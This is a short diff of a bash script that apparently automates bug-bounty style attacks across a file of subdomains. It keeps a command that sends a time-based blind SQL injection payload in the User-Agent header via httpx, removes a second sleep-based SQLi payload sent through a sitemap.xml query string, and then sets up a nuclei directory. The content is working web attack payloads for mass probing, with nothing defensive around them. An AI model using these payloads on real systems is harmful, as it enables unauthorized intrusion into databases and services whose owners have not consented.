@@ -79,9 +79,6 @@ echo -e "${GREEN}Running SQLi attack using User-Agent...${RESET}"
 cat subdomains.txt | httpx -silent -H "User-Agent:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10'" > SQLi-User-Agent.txt
 echo -e "${CYAN}Task Completed!${RESET}"
 
-echo -e "${GREEN}Running SQLi attack using Sitemap...${RESET}"
-cat subdomains.txt | httpx -silent -path "sitemap.xml?offset=1%%3bSELECT%20IF((8303%3E8302)%2CSLEEP(10)%2C356)%23" -rt -timeout 20 -mrt '>10'" > SQLi-Sitemap.txt
-echo -e "${CYAN}Task Completed!${RESET}"
 
 echo -e "${GREEN}Creating nuclei directory...${RESET}"
 mkdir nuclei
